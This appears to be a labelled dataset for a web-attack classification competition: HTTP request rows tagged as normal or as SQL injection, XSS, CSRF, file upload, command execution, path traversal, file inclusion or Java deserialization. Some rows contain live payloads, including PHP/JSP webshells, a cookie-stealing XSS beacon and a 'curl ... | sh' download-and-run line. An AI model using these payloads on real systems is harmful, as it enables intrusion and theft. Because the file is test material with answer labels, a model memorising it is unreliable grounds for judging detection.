row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
2542,2025-11-02 05:26:36,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.74.198,10.252.156.139,/aBOUT/636&timestamp=1763344737,"{""name"":""User3900"",""Email"":""UsER3974@eXamPLe.com"",""mEssaGE"":""hElLo""}&random=2491&cache=true",正常访问,正常访问
10792,2025-10-23 11:56:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.11.75,10.253.224.246,/register,,正常访问,正常访问
1965,2025-11-14 05:11:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.253.83.6,10.253.68.169,/about&random=8990,,正常访问,正常访问
3649,2025-11-08 21:20:19,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.8.120,10.251.227.35,/services/273,,正常访问,正常访问
5849,2025-10-19 19:21:55,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.14.212,192.168.10.38,/pROfILe/AvaTar&cache=true,"------weBKItfOrMBOundArY272045
ContenT-DispOsItIon: forM-data; name=""AvaTaR""; fIleName=""Bac+kDOoR118.jSP""
coNTEnt-TyPe: ApPlicAtion/octEt-sTREam

<% RUntiMe.GetRUntImE().eXec(rEquES+t.gETPARamETer(""cmd"")); %>
------WebKitFORmbOuNDArY509458--&random=8764&cache=true&cache=tr+ue",文件上传攻击,文件上传攻击
1008,2025-10-30 23:30:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.10.130.17,10.18.76.78,/dashboard/123,q=golang&category=books,正常访问,正常访问
4676,2025-11-02 20:23:47,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.168.242,10.16.210.9,/transfer,recipient=attacker273&sum=3452,CSRF攻击,CSRF攻击
4216,2025-10-19 06:53:31,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.148.144,10.187.26.188,/upload,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==309",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
2720,2025-11-03 09:37:29,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.252.168.242,10.16.210.9,/login,,正常访问,正常访问
7538,2025-10-29 07:06:54,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.110.241,10.210.21.212,/file,content=../../../.git/config980,目录遍历攻击,目录遍历攻击
443,2025-10-31 15:18:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.25.73.35,10.168.2.38,/products/123,"{""product_id"":123,""quantity"":2}",正常访问,正常访问
8749,2025-11-03 15:11:19,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.94.202,10.244.155.141,/file/upload,"------WebKitFormBoundary436846
Content-Disposition: form-dat+a; name=""avatar""; filename=""backdoor514.jsp""
Content-Type: a+pplication/octet-stream

<% Runtime.getRuntime().exec(reque+st.getParameter(""cmd"")); %>
------WebKitFormBoundary365018--",文件上传攻击,文件上传攻击
1054,2025-10-20 17:45:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.189.55,10.10.130.86,/home?q=search,,正常访问,正常访问
528,2025-10-29 17:59:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.25.73.35,10.60.33.18,/dAShboaRd&debug=1&debug=1&debug=1,"{%22product_id%22:12+3,%22quaNTiTy%22:2}&+timestamp=1762948282",正常访问,正常访问
8489,2025-10-21 20:08:45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.250.221,10.10.130.86,/admin/settings,recipient=attacker738&sum=6717,CSRF攻击,CSRF攻击
1935,2025-11-12 00:24:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.244.82.103,10.252.133.241,/api/message&debug=1&debug=1,name%3D%3Csvg/onload%3Dalert%26#x28;154%26#x29;%3E&timestamp=1763340284&cache=true,XSS跨站脚本攻击,XSS跨站脚本攻击
654,2025-10-14 20:25:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.53.59.62,10.18.20.134,/search,username=admin' OR '1'='1,SQL注入攻击,SQL注入攻击
1555,2025-10-26 21:08:48,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.204.99,10.210.184.39,/api/message,comment=<img src=x onerror=this.src='http://attacker157.com/steal.php?cookie='+document.cookie>,XSS跨站脚本攻击,XSS跨站脚本攻击
6667,2025-10-21 14:16:27,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.11.0,192.168.124.200,/execute?target=127.0.0.1527|id,,远程命令执行攻击,远程命令执行攻击
9420,2025-10-24 08:17:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.250.222,10.10.130.86,/api/ping,host=127.0.0.1142; type C:\Windows\win.ini,远程命令执行攻击,远程命令执行攻击
6048,2025-11-13 13:12:48,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.11.231,10.18.66.101,/static?read=../../../../etc/mysql/my.cnf637,,目录遍历攻击,目录遍历攻击
3552,2025-11-08 23:47:12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.26.251,10.251.99.247,/message?content=<iframe src=javascript:alert(644)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
4830,2025-11-10 12:08:13,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.208.116.197,10.208.54.30,/search/778,,正常访问,正常访问
2838,2025-11-11 17:32:15,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.248.76.63,10.244.155.144,/admin/settings,target_user=administrator&permission=admin,CSRF攻击,CSRF攻击
7508,2025-10-22 01:43:22,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.7.27,10.234.241.94,/lOoKUp&test=327,TArgET%3D127.0.0.1373|`ID`&debug=1&random=9655,远程命令执行攻击,远程命令执行攻击
5387,2025-11-07 18:50:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,192.168.26.48,10.70.1.194,/search/496&random=5843&test=160,,正常访问,正常访问
1846,2025-10-19 07:22:17,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.96.169,10.210.184.38,/login,q=query3420&category=books,正常访问,正常访问
8068,2025-11-05 14:11:15,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.187.74.218,10.252.158.86,/documents/upload,"------WebKitFormBoundary432084
Content-Disposition: form-data; name=""document""; filename=""malware410.exe""
Content-Type: application/octet-stream

MZ......................
------WebKitFormBoundary828289--",文件上传攻击,文件上传攻击
10642,2025-10-21 12:51:56,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.216.112,10.252.133.241,/static,file=../../../../etc/passwd428,目录遍历攻击,目录遍历攻击
6744,2025-10-29 07:44:48,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.198,/post?comment=<img src=x onerror=this.src='http://attacker567.com/steal.php?cookie='+document.cookie>,,XSS跨站脚本攻击,XSS跨站脚本攻击
2459,2025-10-23 06:54:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/api/execute,ip=127.0.0.1212; curl http://attacker395.com/malware.sh | sh,远程命令执行攻击,远程命令执行攻击
34,2025-11-03 06:51:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.73.35,10.60.33.18,/blog&test=1&test=1&random=495,,正常访问,正常访问
3851,2025-10-19 08:28:16,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==201",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4367,2025-10-31 07:56:33,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/api/data,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==678",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
1060,2025-10-29 15:56:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.25.130.249,10.11.124.113,/login/123&test=1&test=1,page%3D1%26limit%3D10%26sort%3Dname&random=374&random=374&cache=false,正常访问,正常访问
5268,2025-10-20 07:13:54,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.5.99,10.251.227.114,/profile/avatar,"------WebKitFormBoundary223675
Content-Disposition: form-data; name=""avatar""; filename=""backdoor624.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary491624--",文件上传攻击,文件上传攻击
10630,2025-10-25 11:14:41,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.250.221,10.10.130.86,/documents/upload,"------WebKitFormBoundary210305
Content-Disposition: form-data; name=""avatar""; filename=""backdoor564.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary347777--",文件上传攻击,文件上传攻击
9344,2025-11-10 14:09:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.245.113.121,10.244.155.178,/template&test=232,lang%3Dphp://input&debug=0&debug=0,文件包含攻击,文件包含攻击
8660,2025-10-19 00:41:02,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.250.3.232,10.244.155.143,/transfer,redirect_url=http://malicious715.com&token=bypass,CSRF攻击,CSRF攻击
9016,2025-10-18 22:58:27,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.210.108.26,10.60.33.18,/apI/ProdUcts&cache=false,,正常访问,正常访问
6749,2025-11-05 23:06:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.20.199,10.251.227.113,/admin/settings,to=att+acker5+39&amo+unt=87+52,CSRF攻击,CSRF攻击
4691,2025-11-06 21:33:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.187.74.92,10.252.158.86,/api/orders,,正常访问,正常访问
4606,2025-10-28 22:48:26,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.92.7,10.10.228.198,/home,comment=This is a great product 6560,正常访问,正常访问
306,2025-10-21 15:47:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.73.35,10.60.33.18,/PrOcESs&timestamp=1762948282&debug=1&test=1,"RO0AbXNyABFqyXZhlNV0aWwusGFzaFnLdJYGou83gm6GAgaBRgAKbg9hZezhY3RvckKAcxROCmVzag9SzHhwp0AaAaaaAAx3cAaAAbaAaAAHdAaKamf2YS51dGLsLNNyABFQYXZhLMxhbmcUUNvudgltZQAAAAAaAAaaAAAAbXzYABBqYxZHLMXHBMCuu3lZdGVtaAAAAAAAaAaAAAbJKWN1cnjLBnRUaW1LTWlsBGlzSm+f2YQbab3JnLMFwYWNoZs5jb21Tb25zLmNvbgXlY3RP
b25zMS5db25zdGFudE1hcaaaaaAaaAABWACIAaVtyXB0Aa9maMf2YS91dglsl01hcDT4chCiAaaaqAaaAAJzcGaRamf2Ys5syW5nlkLudGVnZXIS4QCK94GHoAiAAUkABxZHBHVLehiAegPhdmEubGFuZY5ODW1iZxkGrjuDC5TgIwIaaHhwAAAAaXNyabRqyxz+HlNv0aWWUSgFZAE1hcaUH2ShdFmDPAWAdsqAkBG9HzeZhY3RvckkAcXROCmVzAg9sZHhwp0AaAAAaaAb3cAAaAbAAaaAHdAAjbxLPYmplY3R0AaJbqNnyAbDQyXZHlMxhBmCuu3RyAW5n063KkLJqYr4CaafaAAv2ywx1ZXhyabbQYxzhlMxhBmCut2JqZWN0AaaAAAAAaAaaaAB4chqaBHrLc3R0aAR0cNVLeA==&test+=1",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6390,2025-10-29 11:36:21,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.212,/UpLOAD,"------WeBKitFoRMbouNdary94754
CONtenT-DiSpOsitiON:%20form-DaTA;%20NAme%3d%22fIlE%22;%20FILEname%3d%22sheLl633.pHp.jpg%22
ConTeNt-TypE:%20IMAgE/JPEG

%3C?php%20system($_GEt[%27cmD%27]);%20?%3e
------webKitforMBoundarY980199--",文件上传攻击,文件上传攻击
10917,2025-11-11 02:51:21,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.64.168,10.187.53.88,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==61",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
7853,2025-11-12 04:58:27,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.14.28,192.168.3.2,/pinG&debug=1&random=9068,dOMAIn%3DTest258.cOm%26%26whoami&cache=true,远程命令执行攻击,远程命令执行攻击
10924,2025-10-19 06:07:18,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.187.75.92,10.187.10.96,/about,,正常访问,正常访问
10283,2025-10-26 14:53:21,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,192.168.20.69,10.251.99.251,/home/75,,正常访问,正常访问
3480,2025-10-31 16:48:20,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.108.208.231,10.253.251.82,"/products?name=' UNION SELECT database(),user(),version()--",,SQL注入攻击,SQL注入攻击
1671,2025-10-22 09:22:41,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.199.214,10.210.184.39,/template?lang%3Dphp://input,,文件包含攻击,文件包含攻击
4627,2025-11-13 13:06:04,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.14.3,10.251.227.122,/login,"category=7'; INSERT INTO admin_users VALUES ('attacker959','password799'); --",SQL注入攻击,SQL注入攻击
9306,2025-11-13 19:46:46,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.19.233,10.253.177.26,/APi/DowNLoad,rEsourCe=../../.Env335,目录遍历攻击,目录遍历攻击
545,2025-11-11 23:23:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.73.35,10.60.33.18,/about,"{%22username%22:%22admin%22,%22password%22:%22secret123%22}",正常访问,正常访问
5047,2025-11-13 10:33:17,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.108.208.231,10.253.176.211,/api/download,document=../../../../windows/system32/drivers/etc/hosts445,目录遍历攻击,目录遍历攻击
1129,2025-10-26 13:31:50,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.24.166,10.240.181.222,/blog,,正常访问,正常访问
7334,2025-11-09 21:06:45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.202,10.251.96.251,/api/ResTore,"rO0ABXNyaBFqyxZhLNV0AWwUSGfZaFNlDJYgOu83gM6GAgAbRgaKBG9hZEZhY3rVckkACXROcmVzAG9sZHHWP0AAAAaAaaX3CaAAabAAAaAhdAaKamf2Ys51dgLSLNNYAbfQYXzhLmXhBmcUUnVuDgltZqAAaAAAAAAAAAaABxZYaBbQYXZHLmXHbmcUU3LZdGVTaAAaAAAAAAAAAABJKwN1cnjlbnrUaw1LTwlsBGlzSm+f2YQbAb3JnLmFWyWNoZS5JB21tb25zLMNVBgxLy3Rp
b25zMS5db25zdGfUDe1hcaAaaaAAaaABWaCIAAVtYXb0AA9MAMF2Ys91dglsl01hcdt4cHciAaAaQaAAAAJzcgARaMF2yS5sYw5NLkludGVnzXiS4QCK94gHOaiaaUkABXZhbhvleHIAEGphdMeUbgfuZy5ODW1IZXKgRjUDC5TgiWIaAHHwAAAaAXNYABRQyXZ+hLNv0AWwUSgfzae1HcauH2ShdFmDPAwADSQakbG9hzEzhY3RvcKkACxroCmVzaG9sZHHWP0AAAAaaAaB3CAAAABAAaAAHdAAJbXlPYmpLy3r0AAJbQnNyAbdqYxzhLmxHbmcuU3Ryaw5N063KKLjqYr4CAAFaAAV2Ywx1zXhYABBqYxZhLmxhbmCuT2JqZwN0AAaAAAAAAaaAAAB4chQABHrlC3r0AAR0CNVLeA%3D%3d1+13",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4042,2025-10-28 18:15:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.248.14.96,10.10.159.189,/services,name=User7982&email=user9531@example.com&message=Hello,正常访问,正常访问
91,2025-11-06 15:07:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.10.179,10.235.17.14,/apI/data&random=4&debug=1&test=1,"rO0AbXNyaDRtES5WYwnrYWdlLk15Q2xhC3MaAAaaaAAaAQWaAHhWdweaHQAcAAAaAnNYABFqYxZhlmxHbMcuUnVudGltzqAaAAAAaAaAAAaAbxZYaBBqYXZhLmXHbmCuU3lzdGVtAAAAAAaAaaaAAAbjkWN1CnJLBNRUAW1LTwlsBGlzSmf2YQBaB3JnLmFWyWNOZS5JB21tB25ZlMNvBGXlY3rp
b25ZMs5CYxnOZU1hcAaaaAaAaAABWAciAavtyxB0Aa9MAmF2YS91d+GlsL01HCDT4cHNYABFqYxZhLnv0awwUSgfZaE1hcaUh2sHDFMDpAWADSqAkbg9HZezhY3rVCKKACxroCmVzaG9sZHhwP0AAaAaAAAb3cAAaABaAAAAHdaaJBXlpyMply3R0AAJbQNNYaBDqYXZhLmxHBmCuu3RYAw5n063KkljQYr4caafaaAV2yWx1ZXhyAbbqYxzHLmXhbMcuT2JqzWN0AAaaAAaAAAAaAAb4ChQaBHrLc3r0Aar0cnVLeA%3D%3D&debug=1&test=1",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
5070,2025-10-22 20:28:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,192.168.6.127,10.253.222.250,/api/orders,"{""username"":""user6847"",""password"":""secret5701""}",正常访问,正常访问
